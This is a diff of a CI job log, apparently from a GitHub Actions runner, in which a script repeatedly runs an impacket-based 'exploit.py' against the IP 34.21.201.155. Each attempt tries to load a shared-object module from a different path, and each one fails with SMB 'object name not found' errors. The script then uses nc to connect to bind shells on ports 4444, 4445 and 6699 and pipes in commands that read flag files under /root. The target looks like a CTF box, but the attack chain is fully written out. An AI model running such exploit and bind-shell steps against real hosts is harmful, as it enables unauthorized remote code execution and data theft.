 impacket.smbconnection.SessionError: SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
 + true
++ for module in /tmp/libspg4444.so /tmp/libspg4445.so /mnt/libspg4444.so /mnt/libspg4445.so tmp/libspg4444.so tmp/libspg4445.so
 + echo 'Trigger round 2 /mnt/libspg4445.so'
 Trigger round 2 /mnt/libspg4445.so
 + python3 exploit.py -t 34.21.201.155 -m /mnt/libspg4445.so
 Traceback (most recent call last):
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 550, in openFile
-    return self._SMBConnection.create(treeId, pathName, desiredAccess, shareMode, creationOption,
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb3.py", line 1320, in create
-    if ans.isValidAnswer(STATUS_SUCCESS):
-       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb3structs.py", line 466, in isValidAnswer
-    raise smb3.SessionError(self['Status'], self)
-impacket.smb3.SessionError: SMB SessionError: STATUS_OBJECT_NAME_NOT_FOUND(The object name is not found.)
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 545, in openFile
+    return self._SMBConnection.nt_create_andx(treeId, pathName, cmd = ntCreate)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb.py", line 4220, in nt_create_andx
+    if smb.isValidAnswer(SMB.SMB_COM_NT_CREATE_ANDX):
+       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb.py", line 1047, in isValidAnswer
+    raise SessionError("SMB Library Error", self['ErrorClass'] + (self['_reserved'] << 8), self['ErrorCode'], self['Flags2'] & SMB.FLAGS2_NT_STATUS, self)
+impacket.smb.SessionError: SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
 
 During handling of the above exception, another exception occurred:
 
 Traceback (most recent call last):
-  File "/home/runner/work/direksethi-profile/direksethi-profile/exploit.py", line 9, in <module>
+  File "/home/runner/work/direksethi-profile/direksethi-profile/exploit.py", line 14, in <module>
     dce.connect()
   File "/home/runner/.local/lib/python3.12/site-packages/impacket/dcerpc/v5/rpcrt.py", line 1359, in connect
     return self._transport.connect()
@@ -283,7 +347,67 @@ Traceback (most recent call last):
   File "/home/runner/.local/lib/python3.12/site-packages/impacket/dcerpc/v5/transport.py", line 525, in connect
     self.__handle = self.__smb_connection.openFile(self.__tid, self.__filename)
                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 554, in openFile
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 547, in openFile
+    raise SessionError(e.get_error_code(), e.get_error_packet())
+impacket.smbconnection.SessionError: SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
++ true
++ for module in /tmp/libspg4444.so /tmp/libspg4445.so /mnt/libspg4444.so /mnt/libspg4445.so tmp/libspg4444.so tmp/libspg4445.so
++ echo 'Trigger round 2 tmp/libspg4444.so'
+Trigger round 2 tmp/libspg4444.so
++ python3 exploit.py -t 34.21.201.155 -m tmp/libspg4444.so
+Traceback (most recent call last):
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 545, in openFile
+    return self._SMBConnection.nt_create_andx(treeId, pathName, cmd = ntCreate)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb.py", line 4220, in nt_create_andx
+    if smb.isValidAnswer(SMB.SMB_COM_NT_CREATE_ANDX):
+       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb.py", line 1047, in isValidAnswer
+    raise SessionError("SMB Library Error", self['ErrorClass'] + (self['_reserved'] << 8), self['ErrorCode'], self['Flags2'] & SMB.FLAGS2_NT_STATUS, self)
+impacket.smb.SessionError: SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/home/runner/work/direksethi-profile/direksethi-profile/exploit.py", line 14, in <module>
+    dce.connect()
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/dcerpc/v5/rpcrt.py", line 1359, in connect
+    return self._transport.connect()
+           ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/dcerpc/v5/transport.py", line 525, in connect
+    self.__handle = self.__smb_connection.openFile(self.__tid, self.__filename)
+                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 547, in openFile
+    raise SessionError(e.get_error_code(), e.get_error_packet())
+impacket.smbconnection.SessionError: SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
++ true
++ for module in /tmp/libspg4444.so /tmp/libspg4445.so /mnt/libspg4444.so /mnt/libspg4445.so tmp/libspg4444.so tmp/libspg4445.so
++ echo 'Trigger round 2 tmp/libspg4445.so'
+Trigger round 2 tmp/libspg4445.so
++ python3 exploit.py -t 34.21.201.155 -m tmp/libspg4445.so
+Traceback (most recent call last):
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 545, in openFile
+    return self._SMBConnection.nt_create_andx(treeId, pathName, cmd = ntCreate)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb.py", line 4220, in nt_create_andx
+    if smb.isValidAnswer(SMB.SMB_COM_NT_CREATE_ANDX):
+       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb.py", line 1047, in isValidAnswer
+    raise SessionError("SMB Library Error", self['ErrorClass'] + (self['_reserved'] << 8), self['ErrorCode'], self['Flags2'] & SMB.FLAGS2_NT_STATUS, self)
+impacket.smb.SessionError: SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/home/runner/work/direksethi-profile/direksethi-profile/exploit.py", line 14, in <module>
+    dce.connect()
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/dcerpc/v5/rpcrt.py", line 1359, in connect
+    return self._transport.connect()
+           ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/dcerpc/v5/transport.py", line 525, in connect
+    self.__handle = self.__smb_connection.openFile(self.__tid, self.__filename)
+                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 547, in openFile
     raise SessionError(e.get_error_code(), e.get_error_packet())
 impacket.smbconnection.SessionError: SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
 + true
@@ -303,29 +427,29 @@ Connect bind shell 4445
 + for p in 4444 4445 6699
 + echo 'Connect bind shell 6699'
 Connect bind shell 6699
-+ printf 'id\nhostname\nfind /root -maxdepth 2 -type f -iname "*flag*" -print -exec cat {} \\;\nexit\n'
 + nc -w 8 34.21.201.155 6699
++ printf 'id\nhostname\nfind /root -maxdepth 2 -type f -iname "*flag*" -print -exec cat {} \\;\nexit\n'
 + true
 + for n in 1 2 3
-+ for base in /tmp /mnt
++ for module in /tmp/libspg4444.so /tmp/libspg4445.so /mnt/libspg4444.so /mnt/libspg4445.so tmp/libspg4444.so tmp/libspg4445.so
 + echo 'Trigger round 3 /tmp/libspg4444.so'
 Trigger round 3 /tmp/libspg4444.so
 + python3 exploit.py -t 34.21.201.155 -m /tmp/libspg4444.so
 Traceback (most recent call last):
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 550, in openFile
-    return self._SMBConnection.create(treeId, pathName, desiredAccess, shareMode, creationOption,
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb3.py", line 1320, in create
-    if ans.isValidAnswer(STATUS_SUCCESS):
-       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb3structs.py", line 466, in isValidAnswer
-    raise smb3.SessionError(self['Status'], self)
-impacket.smb3.SessionError: SMB SessionError: STATUS_OBJECT_NAME_NOT_FOUND(The object name is not found.)
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 545, in openFile
+    return self._SMBConnection.nt_create_andx(treeId, pathName, cmd = ntCreate)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb.py", line 4220, in nt_create_andx
+    if smb.isValidAnswer(SMB.SMB_COM_NT_CREATE_ANDX):
+       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb.py", line 1047, in isValidAnswer
+    raise SessionError("SMB Library Error", self['ErrorClass'] + (self['_reserved'] << 8), self['ErrorCode'], self['Flags2'] & SMB.FLAGS2_NT_STATUS, self)
+impacket.smb.SessionError: SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
 
 During handling of the above exception, another exception occurred:
 
 Traceback (most recent call last):
-  File "/home/runner/work/direksethi-profile/direksethi-profile/exploit.py", line 9, in <module>
+  File "/home/runner/work/direksethi-profile/direksethi-profile/exploit.py", line 14, in <module>
     dce.connect()
   File "/home/runner/.local/lib/python3.12/site-packages/impacket/dcerpc/v5/rpcrt.py", line 1359, in connect
     return self._transport.connect()
@@ -333,28 +457,29 @@ Traceback (most recent call last):
   File "/home/runner/.local/lib/python3.12/site-packages/impacket/dcerpc/v5/transport.py", line 525, in connect
     self.__handle = self.__smb_connection.openFile(self.__tid, self.__filename)
                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 554, in openFile
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 547, in openFile
     raise SessionError(e.get_error_code(), e.get_error_packet())
 impacket.smbconnection.SessionError: SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
 + true
++ for module in /tmp/libspg4444.so /tmp/libspg4445.so /mnt/libspg4444.so /mnt/libspg4445.so tmp/libspg4444.so tmp/libspg4445.so
 + echo 'Trigger round 3 /tmp/libspg4445.so'
 Trigger round 3 /tmp/libspg4445.so
 + python3 exploit.py -t 34.21.201.155 -m /tmp/libspg4445.so
 Traceback (most recent call last):
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 550, in openFile
-    return self._SMBConnection.create(treeId, pathName, desiredAccess, shareMode, creationOption,
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb3.py", line 1320, in create
-    if ans.isValidAnswer(STATUS_SUCCESS):
-       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb3structs.py", line 466, in isValidAnswer
-    raise smb3.SessionError(self['Status'], self)
-impacket.smb3.SessionError: SMB SessionError: STATUS_OBJECT_NAME_NOT_FOUND(The object name is not found.)
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 545, in openFile
+    return self._SMBConnection.nt_create_andx(treeId, pathName, cmd = ntCreate)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb.py", line 4220, in nt_create_andx
+    if smb.isValidAnswer(SMB.SMB_COM_NT_CREATE_ANDX):
+       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb.py", line 1047, in isValidAnswer
+    raise SessionError("SMB Library Error", self['ErrorClass'] + (self['_reserved'] << 8), self['ErrorCode'], self['Flags2'] & SMB.FLAGS2_NT_STATUS, self)
+impacket.smb.SessionError: SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
 
 During handling of the above exception, another exception occurred:
 
 Traceback (most recent call last):
-  File "/home/runner/work/direksethi-profile/direksethi-profile/exploit.py", line 9, in <module>
+  File "/home/runner/work/direksethi-profile/direksethi-profile/exploit.py", line 14, in <module>
     dce.connect()
   File "/home/runner/.local/lib/python3.12/site-packages/impacket/dcerpc/v5/rpcrt.py", line 1359, in connect
     return self._transport.connect()
@@ -362,29 +487,29 @@ Traceback (most recent call last):
   File "/home/runner/.local/lib/python3.12/site-packages/impacket/dcerpc/v5/transport.py", line 525, in connect
     self.__handle = self.__smb_connection.openFile(self.__tid, self.__filename)
                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 554, in openFile
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 547, in openFile
     raise SessionError(e.get_error_code(), e.get_error_packet())
 impacket.smbconnection.SessionError: SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
 + true
-+ for base in /tmp /mnt
++ for module in /tmp/libspg4444.so /tmp/libspg4445.so /mnt/libspg4444.so /mnt/libspg4445.so tmp/libspg4444.so tmp/libspg4445.so
 + echo 'Trigger round 3 /mnt/libspg4444.so'
 Trigger round 3 /mnt/libspg4444.so
 + python3 exploit.py -t 34.21.201.155 -m /mnt/libspg4444.so
 Traceback (most recent call last):
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 550, in openFile
-    return self._SMBConnection.create(treeId, pathName, desiredAccess, shareMode, creationOption,
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb3.py", line 1320, in create
-    if ans.isValidAnswer(STATUS_SUCCESS):
-       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb3structs.py", line 466, in isValidAnswer
-    raise smb3.SessionError(self['Status'], self)
-impacket.smb3.SessionError: SMB SessionError: STATUS_OBJECT_NAME_NOT_FOUND(The object name is not found.)
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 545, in openFile
+    return self._SMBConnection.nt_create_andx(treeId, pathName, cmd = ntCreate)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb.py", line 4220, in nt_create_andx
+    if smb.isValidAnswer(SMB.SMB_COM_NT_CREATE_ANDX):
+       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb.py", line 1047, in isValidAnswer
+    raise SessionError("SMB Library Error", self['ErrorClass'] + (self['_reserved'] << 8), self['ErrorCode'], self['Flags2'] & SMB.FLAGS2_NT_STATUS, self)
+impacket.smb.SessionError: SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
 
 During handling of the above exception, another exception occurred:
 
 Traceback (most recent call last):
-  File "/home/runner/work/direksethi-profile/direksethi-profile/exploit.py", line 9, in <module>
+  File "/home/runner/work/direksethi-profile/direksethi-profile/exploit.py", line 14, in <module>
     dce.connect()
   File "/home/runner/.local/lib/python3.12/site-packages/impacket/dcerpc/v5/rpcrt.py", line 1359, in connect
     return self._transport.connect()
@@ -392,28 +517,29 @@ Traceback (most recent call last):
   File "/home/runner/.local/lib/python3.12/site-packages/impacket/dcerpc/v5/transport.py", line 525, in connect
     self.__handle = self.__smb_connection.openFile(self.__tid, self.__filename)
                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 554, in openFile
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 547, in openFile
     raise SessionError(e.get_error_code(), e.get_error_packet())
 impacket.smbconnection.SessionError: SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
 + true
++ for module in /tmp/libspg4444.so /tmp/libspg4445.so /mnt/libspg4444.so /mnt/libspg4445.so tmp/libspg4444.so tmp/libspg4445.so
 + echo 'Trigger round 3 /mnt/libspg4445.so'
 Trigger round 3 /mnt/libspg4445.so
 + python3 exploit.py -t 34.21.201.155 -m /mnt/libspg4445.so
 Traceback (most recent call last):
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 550, in openFile
-    return self._SMBConnection.create(treeId, pathName, desiredAccess, shareMode, creationOption,
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb3.py", line 1320, in create
-    if ans.isValidAnswer(STATUS_SUCCESS):
-       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb3structs.py", line 466, in isValidAnswer
-    raise smb3.SessionError(self['Status'], self)
-impacket.smb3.SessionError: SMB SessionError: STATUS_OBJECT_NAME_NOT_FOUND(The object name is not found.)
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 545, in openFile
+    return self._SMBConnection.nt_create_andx(treeId, pathName, cmd = ntCreate)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb.py", line 4220, in nt_create_andx
+    if smb.isValidAnswer(SMB.SMB_COM_NT_CREATE_ANDX):
+       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb.py", line 1047, in isValidAnswer
+    raise SessionError("SMB Library Error", self['ErrorClass'] + (self['_reserved'] << 8), self['ErrorCode'], self['Flags2'] & SMB.FLAGS2_NT_STATUS, self)
+impacket.smb.SessionError: SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
 
 During handling of the above exception, another exception occurred:
 
 Traceback (most recent call last):
-  File "/home/runner/work/direksethi-profile/direksethi-profile/exploit.py", line 9, in <module>
+  File "/home/runner/work/direksethi-profile/direksethi-profile/exploit.py", line 14, in <module>
     dce.connect()
   File "/home/runner/.local/lib/python3.12/site-packages/impacket/dcerpc/v5/rpcrt.py", line 1359, in connect
     return self._transport.connect()
@@ -421,7 +547,67 @@ Traceback (most recent call last):
   File "/home/runner/.local/lib/python3.12/site-packages/impacket/dcerpc/v5/transport.py", line 525, in connect
     self.__handle = self.__smb_connection.openFile(self.__tid, self.__filename)
                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 554, in openFile
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 547, in openFile
+    raise SessionError(e.get_error_code(), e.get_error_packet())
+impacket.smbconnection.SessionError: SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
++ true
++ for module in /tmp/libspg4444.so /tmp/libspg4445.so /mnt/libspg4444.so /mnt/libspg4445.so tmp/libspg4444.so tmp/libspg4445.so
++ echo 'Trigger round 3 tmp/libspg4444.so'
+Trigger round 3 tmp/libspg4444.so
++ python3 exploit.py -t 34.21.201.155 -m tmp/libspg4444.so
+Traceback (most recent call last):
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 545, in openFile
+    return self._SMBConnection.nt_create_andx(treeId, pathName, cmd = ntCreate)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb.py", line 4220, in nt_create_andx
+    if smb.isValidAnswer(SMB.SMB_COM_NT_CREATE_ANDX):
+       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb.py", line 1047, in isValidAnswer
+    raise SessionError("SMB Library Error", self['ErrorClass'] + (self['_reserved'] << 8), self['ErrorCode'], self['Flags2'] & SMB.FLAGS2_NT_STATUS, self)
+impacket.smb.SessionError: SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/home/runner/work/direksethi-profile/direksethi-profile/exploit.py", line 14, in <module>
+    dce.connect()
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/dcerpc/v5/rpcrt.py", line 1359, in connect
+    return self._transport.connect()
+           ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/dcerpc/v5/transport.py", line 525, in connect
+    self.__handle = self.__smb_connection.openFile(self.__tid, self.__filename)
+                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 547, in openFile
+    raise SessionError(e.get_error_code(), e.get_error_packet())
+impacket.smbconnection.SessionError: SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
++ true
++ for module in /tmp/libspg4444.so /tmp/libspg4445.so /mnt/libspg4444.so /mnt/libspg4445.so tmp/libspg4444.so tmp/libspg4445.so
++ echo 'Trigger round 3 tmp/libspg4445.so'
+Trigger round 3 tmp/libspg4445.so
++ python3 exploit.py -t 34.21.201.155 -m tmp/libspg4445.so
+Traceback (most recent call last):
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 545, in openFile
+    return self._SMBConnection.nt_create_andx(treeId, pathName, cmd = ntCreate)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb.py", line 4220, in nt_create_andx
+    if smb.isValidAnswer(SMB.SMB_COM_NT_CREATE_ANDX):
+       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb.py", line 1047, in isValidAnswer
+    raise SessionError("SMB Library Error", self['ErrorClass'] + (self['_reserved'] << 8), self['ErrorCode'], self['Flags2'] & SMB.FLAGS2_NT_STATUS, self)
+impacket.smb.SessionError: SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/home/runner/work/direksethi-profile/direksethi-profile/exploit.py", line 14, in <module>
+    dce.connect()
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/dcerpc/v5/rpcrt.py", line 1359, in connect
+    return self._transport.connect()
+           ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/dcerpc/v5/transport.py", line 525, in connect
+    self.__handle = self.__smb_connection.openFile(self.__tid, self.__filename)
+                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 547, in openFile
     raise SessionError(e.get_error_code(), e.get_error_packet())
 impacket.smbconnection.SessionError: SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
 + true
@@ -429,18 +615,18 @@ impacket.smbconnection.SessionError: SMB SessionError: code: 0xc0000034 - STATUS
 + for p in 4444 4445 6699
 + echo 'Connect bind shell 4444'
 Connect bind shell 4444
-+ printf 'id\nhostname\nfind /root -maxdepth 2 -type f -iname "*flag*" -print -exec cat {} \\;\nexit\n'
 + nc -w 8 34.21.201.155 4444
++ printf 'id\nhostname\nfind /root -maxdepth 2 -type f -iname "*flag*" -print -exec cat {} \\;\nexit\n'
 + true
 + for p in 4444 4445 6699
 + echo 'Connect bind shell 4445'
 Connect bind shell 4445
-+ printf 'id\nhostname\nfind /root -maxdepth 2 -type f -iname "*flag*" -print -exec cat {} \\;\nexit\n'
 + nc -w 8 34.21.201.155 4445
++ printf 'id\nhostname\nfind /root -maxdepth 2 -type f -iname "*flag*" -print -exec cat {} \\;\nexit\n'
 + true
 + for p in 4444 4445 6699
 + echo 'Connect bind shell 6699'
 Connect bind shell 6699
-+ printf 'id\nhostname\nfind /root -maxdepth 2 -type f -iname "*flag*" -print -exec cat {} \\;\nexit\n'
 + nc -w 8 34.21.201.155 6699
++ printf 'id\nhostname\nfind /root -maxdepth 2 -type f -iname "*flag*" -print -exec cat {} \\;\nexit\n'
 + true
